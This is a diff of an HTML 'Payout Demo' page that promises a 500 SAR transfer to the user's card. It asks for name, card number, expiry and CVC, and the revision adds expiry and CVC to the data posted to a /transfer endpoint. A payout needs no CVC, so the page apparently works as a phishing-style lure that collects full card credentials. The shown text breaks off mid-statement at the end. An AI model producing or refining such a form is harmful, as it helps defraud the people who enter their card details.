@@ -1,45 +1,74 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Wallet Payout</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payout Demo</title>
     <style>
-        body { font-family: sans-serif; background: #f0f0f0; display: flex; justify-content: center; padding: 20px; }
-        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 350px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
-        #status { margin-top: 15px; text-align: center; font-weight: bold; }
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        h2 { color: #333; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #1e7e34; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        button:hover { background-color: #155d27; }
+        #message { margin-top: 15px; font-weight: bold; display: none; }
+        .success { color: green; }
+        .error { color: red; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2 style="text-align:center">Payout Demo</h2>
-        <p style="text-align:center">Balance: 500 SAR</p>
-        <input type="text" id="name" placeholder="Cardholder Name">
-        <input type="text" id="card" placeholder="16-Digit Card Number" maxlength="16">
-        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
-        <input type="password" id="cvc" placeholder="CVC" maxlength="3">
-        <button onclick="send()">Transfer to Card</button>
-        <div id="status"></div>
-    </div>
 
-    <script>
-        async function send() {
-            const status = document.getElementById('status');
-            status.innerText = "Processing...";
-            const res = await fetch('/transfer', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    name: document.getElementById('name').value,
-                    cardNumber: document.getElementById('card').value,
-                    amount: 500
-                })
-            });
-            const data = await res.json();
-            status.innerText = data.message;
-            status.style.color = data.status === "Success" ? "green" : "red";
+<div class="container">
+    <h2>Payout Demo</h2>
+    <p>Balance: 500 SAR</p>
+    
+    <input type="text" id="name" placeholder="Full Name" required>
+    <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" required>
+    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+    <input type="text" id="cvc" placeholder="CVC" maxlength="4" required>
+    
+    <button onclick="sendData()">Transfer to Card</button>
+    <div id="message"></div>
+</div>
+
+<script>
+    async function sendData() {
+        const name = document.getElementById('name').value;
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiry = document.getElementById('expiry').value;
+        const cvc = document.getElementById('cvc').value;
+        const messageDiv = document.getElementById('message');
+
+        if (!name || !cardNumber || !expiry || !cvc) {
+            messageDiv.textContent = "Error: All fields are required!";
+            messageDiv.className = "error";
+            messageDiv.style.display = "block";
+            return;
         }
-    </script>
-</body>
-</html>
+
+        const payload = {
+            name: name,
+            cardNumber: cardNumber,
+            expiry: expiry,
+            cvc: cvc,
+            amount: 500
+        };
+
+        try {
+            const response = await fetch('/transfer', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            const result = await response.json();
+
+            if (response.ok) {
+                messageDiv.textContent = result.message;
+                messageDiv.className = "success";
+            } else {
+                messageDiv.textContent = "Error: Transaction failed";
+                messageDiv.className = "error";
+            }
+        } catch (error) {
+            message
